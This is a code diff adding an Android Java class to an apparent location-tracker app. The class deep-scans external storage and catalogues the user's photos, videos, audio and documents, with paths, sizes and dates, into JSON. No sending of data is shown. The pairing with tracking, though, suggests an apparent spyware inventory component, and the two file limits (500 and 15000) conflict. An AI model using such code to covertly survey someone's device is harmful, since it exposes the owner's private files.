@@ -1,0 +1,193 @@
+package com.example.locationtracker;
+
+import android.content.Context;
+import android.os.Environment;
+import android.util.Log;
+import org.json.JSONArray;
+import org.json.JSONObject;
+import java.io.File;
+import java.text.SimpleDateFormat;
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.Date;
+import java.util.List;
+import java.util.Locale;
+
+public class FileManager {
+    private static final String TAG = "FileManager";
+    private static final SimpleDateFormat dateFormat =
+            new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US);
+
+    public static JSONObject getFileList(Context context) {
+        JSONObject result = new JSONObject();
+
+        try {
+            List<FileInfo> allFiles = new ArrayList<>();
+
+            File root = Environment.getExternalStorageDirectory();
+            if (root != null && root.exists() && root.canRead()) {
+                Log.d(TAG, "Starting deep scan from root: " + root.getAbsolutePath());
+                scanDirectory(root, allFiles, 10);
+            } else {
+                Log.e(TAG, "Cannot read external storage root!");
+            }
+
+            JSONObject categories = new JSONObject();
+            categories.put("images", filterByType(allFiles, "image"));
+            categories.put("videos", filterByType(allFiles, "video"));
+            categories.put("audio", filterByType(allFiles, "audio"));
+            categories.put("documents", filterByType(allFiles, "document"));
+
+            result.put("categories", categories);
+            result.put("total", allFiles.size());
+
+            Log.d(TAG, "Final count: " + allFiles.size() + " files");
+            Log.d(TAG, "Images: " + categories.getJSONArray("images").length());
+            Log.d(TAG, "Videos: " + categories.getJSONArray("videos").length());
+            Log.d(TAG, "Audio: " + categories.getJSONArray("audio").length());
+            Log.d(TAG, "Documents: " + categories.getJSONArray("documents").length());
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error scanning files", e);
+
+            try {
+                JSONObject emptyCategories = new JSONObject();
+                emptyCategories.put("images", new JSONArray());
+                emptyCategories.put("videos", new JSONArray());
+                emptyCategories.put("audio", new JSONArray());
+                emptyCategories.put("documents", new JSONArray());
+                result.put("categories", emptyCategories);
+                result.put("total", 0);
+            } catch (Exception ignored) {}
+        }
+
+        return result;
+    }
+
+    private static void scanDirectory(File directory, List<FileInfo> fileList, int maxDepth) {
+        if (maxDepth <= 0 || fileList.size() >= 500) return;
+
+        try {
+            File[] files = directory.listFiles();
+            if (files == null) {
+                Log.w(TAG, "listFiles() returned null for: " + directory.getAbsolutePath());
+                return;
+            }
+
+            Log.d(TAG, "Found " + files.length + " items in " + directory.getName());
+
+            for (File file : files) {
+                if (fileList.size() >= 15000) break;
+
+                if (file.isDirectory()) {
+                    scanDirectory(file, fileList, maxDepth - 1);
+                } else {
+                    FileInfo fileInfo = createFileInfo(file);
+                    if (fileInfo != null) {
+                        fileList.add(fileInfo);
+                        Log.d(TAG, "Added file: " + file.getName() + " (" + fileInfo.type + ")");
+                    }
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error scanning directory: " + directory.getPath(), e);
+        }
+    }
+
+    private static FileInfo createFileInfo(File file) {
+        try {
+            String fileName = file.getName();
+            String extension = getFileExtension(fileName).toLowerCase();
+
+            if (!isRelevantFile(extension)) {
+                return null;
+            }
+
+            FileInfo info = new FileInfo();
+            info.name = fileName;
+            info.path = file.getAbsolutePath();
+            info.size = file.length();
+            info.sizeFormatted = formatFileSize(file.length());
+            info.date = file.lastModified();
+            info.dateFormatted = dateFormat.format(new Date(file.lastModified()));
+            info.type = getFileType(extension);
+            info.extension = extension;
+
+            return info;
+
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
+    private static JSONArray filterByType(List<FileInfo> files, String type) {
+        JSONArray result = new JSONArray();
+
+        List<FileInfo> filtered = new ArrayList<>();
+        for (FileInfo file : files) {
+            if (file.type.equals(type)) {
+                filtered.add(file);
+            }
+        }
+
+        Collections.sort(filtered, (a, b) -> Long.compare(b.date, a.date));
+
+        try {
+            for (FileInfo file : filtered) {
+                JSONObject obj = new JSONObject();
+                obj.put("name", file.name);
+                obj.put("path", file.path);
+                obj.put("size", file.sizeFormatted);
+                obj.put("date", file.dateFormatted);
+                obj.put("type", file.type);
+                obj.put("extension", file.extension);
+                result.put(obj);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error filtering files", e);
+        }
+
+        return result;
+    }
+
+    private static String getFileExtension(String fileName) {
+        int lastDot = fileName.lastIndexOf('.');
+        if (lastDot > 0 && lastDot < fileName.length() - 1) {
+            return fileName.substring(lastDot + 1);
+        }
+        return "";
+    }
+
+    private static boolean isRelevantFile(String extension) {
+        return extension.matches("jpg|jpeg|png|gif|bmp|webp|" +
+                "mp4|avi|mkv|mov|3gp|" +
+                "mp3|wav|m4a|ogg|flac|aac|" +
+                "pdf|doc|docx|txt|xls|xlsx|ppt|pptx");
+    }
+
+    private static String getFileType(String extension) {
+        if (extension.matches("jpg|jpeg|png|gif|bmp|webp")) return "image";
+        if (extension.matches("mp4|avi|mkv|mov|3gp")) return "video";
+        if (extension.matches("mp3|wav|m4a|ogg|flac|aac")) return "audio";
+        if (extension.matches("pdf|doc|docx|txt|xls|xlsx|ppt|pptx")) return "document";
+        return "other";
+    }
+
+    private static String formatFileSize(long bytes) {
+        if (bytes < 1024) return bytes + " B";
+        if (bytes < 1024 * 1024) return String.format(Locale.US, "%.1f KB", bytes / 1024.0);
+        if (bytes < 1024 * 1024 * 1024) return String.format(Locale.US, "%.1f MB", bytes / (1024.0 * 1024));
+        return String.format(Locale.US, "%.1f GB", bytes / (1024.0 * 1024 * 1024));
+    }
+
+    static class FileInfo {
+        String name;
+        String path;
+        long size;
+        String sizeFormatted;
+        long date;
+        String dateFormatted;
+        String type;
+        String extension;
+    }
+}
